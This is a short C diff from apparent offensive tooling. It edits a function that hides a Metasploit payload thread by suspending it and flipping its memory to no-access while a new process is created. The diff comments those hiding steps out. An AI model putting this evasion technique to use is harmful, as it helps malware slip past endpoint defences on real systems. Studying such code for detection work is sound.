@@ -46,15 +46,15 @@ BOOL createProcessNinja(LPVOID options) {
 	printf("Thread Handle: %02lX\n", metasploitThread);
 
 	
-	if (SuspendThread(metasploitThread) != -1) {
-		printf("[!] Suspended thread \n");
-	}
-	else {
-		printf("Couldnt suspend thread: %d\n", GetLastError());
-	}
+	//if (SuspendThread(metasploitThread) != -1) {
+	//	printf("[!] Suspended thread \n");
+	//}
+	//else {
+	//	printf("Couldnt suspend thread: %d\n", GetLastError());
+	//}
 
 
-	setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_NOACCESS);
+	//setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_NOACCESS);
 	
 	BOOL res = CreateProcessInternalW(processOptions->hToken,
 		processOptions->lpApplicationName,
@@ -71,14 +71,14 @@ BOOL createProcessNinja(LPVOID options) {
 
 	Sleep(7000);
 
-	if (setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_EXECUTE_READWRITE)) {
-		printf("ALL OK, resuming thread\n");
+	//if (setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_EXECUTE_READWRITE)) {
+	//	printf("ALL OK, resuming thread\n");
 
-		ResumeThread(metasploitThread);
-	}
-	else {
-		printf("[X] Coundn't revert permissions back to normal\n");
-	}
+	//	ResumeThread(metasploitThread);
+	//}
+	//else {
+	//	printf("[X] Coundn't revert permissions back to normal\n");
+	//}
 
 	HeapFree(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, processOptions);
 	return res;
